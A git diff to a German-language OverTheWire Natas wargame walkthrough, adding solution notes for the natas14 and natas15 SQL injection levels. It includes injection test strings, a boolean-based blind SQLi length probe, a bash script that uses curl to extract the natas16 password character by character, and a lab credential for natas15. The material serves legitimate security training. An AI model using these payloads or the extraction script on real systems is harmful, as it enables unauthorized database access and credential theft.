@@ -1312,6 +1312,9 @@ Im `natas14` Level geht es darum, per **SQL Injection** (**SQLi**) die Authentif
 
 Bei SQL-Injections ist es entscheidend, die verwendete Datenbank-Engine und die genaue **Syntax der Query-Konstruktion** zu kennen. In diesem Fall handelt es sich um eine **MySQL**/**MariaDB-Datenbank** (erkennbar an der `mysqli_connect()`-Funktion).
 
+Außerdem solltest du mit Tests herausfinden, welchen Wert du wie extrahieren kannst. Dies machst du am einfachsten mit verschiedenen SQL-Injections. Die einfachste Methode und die, die am häufigsten genutzt wird, ist: `' OR 1=1 --` (oder mit `#`, statt `--` auskommentiert). Probiere auch Methoden wie `sleep(x)` und lasse die Anwendung eine gewisse Zeit "schlafen". Letzen Endes ist es wichtig zu überprüfen, ob die Datenbank auf SQL-Injections im Allgemeinen anschlägt.
+
+
 **1. Analyse der Schwachstelle**
 
 Über den Source-Code hast du Einblick in die kritische, unsichere SQL-Abfrage (vereinfacht dargestellt):
@@ -1405,8 +1408,145 @@ URL:        http://natas15.natas.labs.overthewire.org
 <details>
     <summary>Lösung</summary>
 
+In `natas15` ist die Schwachstelle eine **Blind SQL Injection**. Sie wird nicht durch eine Fehlermeldung (`Error-Based`) ausgenutzt, sondern durch einen **Booleschen Indikator** (Boolean-Based). Der Indikator ist die logische Unterscheidung in der Anwendungsausgabe ("`This user exists.`" vs. "`This user doesn't exist.`").
+
+Die Hauptseite beinhaltet ein Eingabefeld, das bei Nutzung den entsprechenden Benutzernamen sucht und bei einem Treffer die Seite `/index.php` mit den Werten "This user exists." oder "This user doesn't exist." lädt.
+
+Der Source-Code verrät, dass es eine Datenbank mit dem Namen `users` gibt, in denen die Attribute `username` und `password` gespeichert werden. 
+
+<details><summary>Source-Code anzeigen</summary>
+
+![Natas16 SourceCode](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16b.png)
 </details>
 
+Die Nutzung von `$_REQUEST` ist ein Indikator für fehlende Eingabekontrolle (Input Validation). Du muss sowohl `GET` als auch `POST` testen, wobei `POST` die primäre Methode für Formulare ist. Das Risiko ist die fehlende Beschränkung auf eine bestimmte HTTP-Methode.
+
+In meiner virtuellen Umgebung nutze ich Kali für den Exploit-Angriff. Außerdem helfen mir Tools wie `Burp` oder `cURL` dabei, Anfragen an die Server komfortabler zu übermitteln.
+
+Burp nutze ich mit der Firefox-Extension `foxyproxy`, was die Übermittlung der Daten vereinfacht, da ich nicht angewiesen bin auf den internen Browser von Burp.
+
+![Natas16 Burp Suite SQLi](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16c.png)
+
+**1. Vorbereitung auf den Exploit**
+
+Mit der generellen `' Or 1=1 --` (in Beispiel `natas` mit `"`) Befehlskette kann eine SQL-Injection provoziert werden. Außerdem ist der Ausbruch je nach Datenbank unterschiedlich. Der Ausbruch mit `"` gelingt, weil die SQL-Abfrage die Benutzereingabe mit doppelten Anführungszeichen umschließt (`username=\"".$_REQUEST["username"]."\"`). 
+
+**Infos zum Source-Code:**
+
+Die `$query`-Variable, die den Select-Befehl deklariert, wird zusammen mit der Datenbankverbindung in einer neuen Variable `$res` deklariert und anschließend mit der Funktion `mysqli_num_rows()` verglichen, ob der Wert in `$res` größer als `0` ist.
+
+Die Logik tritt ein, sobald ein Wert über die Eingabenübermittlung der Hauptseite von der Datenbank zurückgegeben werden kann, weil er in ihr existiert.
+
+Die Datenbank von `natas15` hat nur einen Datensatz und der ist: `natas16`.
+
+Dies bestätigt, dass die Anwendung für **Error-Based SQLi** geschützt ist und der Angreifer gezwungen ist, auf die Boolesche Methode auszuweichen..
+
+
+**2. Passwortlänge herausfinden**
+
+Da es sich um das gleiche Passwort wie alle `natas`-Level handelt, kannst du davon ausgehen, dass auch hier das Passwort genauso lang ist.
+
+Allerdings kannst du das auch mit SQL-Injections, die gewisse Vorzeichen enthalten, wie `<`, `>` oder `=` herausfinden. Da du davon ausgehen kannst, die Längen der Passwörter in realen Datenbanken nicht zu kennen.
+
+Auf das `natas15` Beispiel angewendet, kannst du folgenden Befehl nutzen, um die Länge des Passworts zu erhalten:
+
+```php
+# Überprüft, ob die Länge des Inhalts im Passwort für natas16 32 Bytes groß ist.
+natas16" And Length(password) = 32 #
+```
+
+Um Passwörter und ihre Länge zu überprüfen, ersetzt du die Zahl `32` mit der Zahl, die du prüfen willst.
+
+Das Passwort der `natas`-Level ist 32 Bytes groß. Das erzeugt den "`This user exists.`" Response. Alle anderen Zahlen erzeugen die Fehlermeldung, der User existiere nicht.
+
+Kleine Skripte in `Python` oder `Shell` helfen dabei, die Anfragen im Hintergrund mit Tools wie `cURL` durchzuführen. Das macht den Prozess der Iteration einfacher.   
+Für echte Penetrationstests wird die Automatisierung von Blind SQL Injection immer mit spezialisierten Frameworks wie `SQLMap` oder `Python` (mit der `requests`-Library) durchgeführt. Diese Tools übernehmen die Handhabung der URL-Kodierung, die Iterationslogik (binäre Suche vs. sequentiell) und die boolesche Indikator-Erkennung weitaus zuverlässiger als ein bash-Skript.
+
+Ich habe mir von der KI ein Programm schreiben lassen, das genau diesen Prozess bewerkstelligt. Das Progamm ist in der Programmiersprache `bash` geschrieben und beinhaltet im Wesentlichen zwei `For-Schleifen`, von der die erste Schleife die Position des Passworts addiert und die zweite Schleife das Alphabet durchläuft.   
+Das Alphabet wird in der Variable `$ALPHABET` deklariert. 
+
+Kopiere das Skript oder schreibe dein eigenes. Du solltest nur kontrollieren, ob die Authentifizierungs-Daten aktuell sind, falls nicht, dann änderst du diese in der `AUTH`-Varible.
+
+<details><summary>Code anzeigen</summary>
+
+Kopieren und ausführen mit `./deinDateiname.sh`
+```bash
+#!/bin/bash
+
+# Das Alphabet deklarieren
+ALPHABET="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+# Zeichenlänge des Passworts
+MAX_LENGTH=33
+# Server URL und Authentifikation
+URL="http://natas15.natas.labs.overthewire.org/index.php"
+AUTH="natas15:5dQIqbsFcz3YotINYfRZSzWbLKm0lrVx" # Prüfen, ob Zugangsdaten aktuell
+
+# Payload Base und Ende // %27 URL-Encding für das Zeichen ' 
+PAYLOAD_BASE='natas16" AND (SELECT 1 FROM users WHERE username=%27natas16%27 AND binary SUBSTRING(password,'
+PAYLOAD_END=",1)='__CHAR__') #" # CHAR als Platzhalter, wird später ersetzt in $SQL-INJECTION_TEST
+PASSWORD=""
+
+echo "Starting Blind SQLi..."
+echo -n "Found Password: " # Start der fortlaufenden Ausgabe
+
+# Iteriert die Position einzelner Passwortzeichen
+for ((POS=1; POS <= MAX_LENGTH; POS++)); do
+    FOUND_CHAR=0
+
+    # Iteriert du die Variable ALPHABET
+    for ((I=0; I < ${#ALPHABET}; I++)); do
+        CHAR="${ALPHABET:$I:1}"
+
+        # Payload-Konstruktion || __CHAR__/ Platzhalter wird ersetzt durch /$CHAR Variable
+        SQL_INJECTION_TEST="${PAYLOAD_BASE}${POS}${PAYLOAD_END/__CHAR__/$CHAR}"
+        
+        # Neue Variablendeklaration für Payload
+        POST_DATA="${SQL_INJECTION_TEST}"
+        
+        # Curl führt im Hintergrund (-s) aus und sendet Exploits
+        RESPONSE=$(curl -s -u "$AUTH" -d "$POST_DATA" "$URL")
+        
+        # Indikator-Prüfung
+        if echo "$RESPONSE" | grep -q "This user exists"; then
+            
+            # Speichere das ASCII-Zeichen, für das endgültige Passwort
+            PASSWORD="$PASSWORD$CHAR" 
+            
+            # Nur das Zeichen ausgeben, da die Ausgabe mit -n gemacht wurde
+            echo -n "$CHAR" 
+            
+            FOUND_CHAR=1
+            break # Zeichen gefunden, nächste Position prüfen
+        fi
+    done
+    
+    # LOGIK: Wenn nach Durchlauf des gesamten Alphabets KEIN Zeichen gefunden wurde,
+    # ist das Passwort zu Ende.
+    if [ $FOUND_CHAR -eq 0 ]; then
+        break
+    fi
+done
+
+# Endausgabe
+echo -e "\n\nPassword is: $PASSWORD"
+```
+</details>
+
+Nachdem du das Skript bei dir lokal kopiert und erstellt hast, kannst du es mit folgendem Befehl ausführen:
+
+```bash
+./dateiname.sh
+```
+
+Das wird ein wenig Zeit in Anspruch nehmen, da 32 Zeichen des Passworts mit den 62 Zeichen aus der definierten Alphabet-Variable iteriert werden. Das geschieht automatisch mit dem `curl`-Befehl. Sollte die ersten Position nicht ermitteln werden können, bricht das Programm automatisch mit einer Fehlermeldung ab. Dann kannst du noch einmal die Variablen überprüfen und sie korrigieren, wenn nötig. Achte auf das aktuelle Passwort von `natas15`.
+
+
+Wenn das Programm erfolgreich war, dann erhälst du das Passwort und kannst mit dem nächsten Level fortsetzen.
+
+![Natas16 Password mit Skript](/09-practice-labs/ressourcen/pictures/overthewire/natas/natas16d.png)
+
+
+</details>
 
 
 <div align=right>
@@ -1414,6 +1554,22 @@ URL:        http://natas15.natas.labs.overthewire.org
 [↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
 
 </div>
+
+
+## Natas 16 -> 17
+
+```text
+Username:   natas15
+
+URL:        http://natas15.natas.labs.overthewire.org
+```
+
+<details>
+    <summary>Lösung</summary>
+
+
+</details>
+
 
 
 # Wird laufend fortgesetzt, bis das letzte Level geschafft ist.
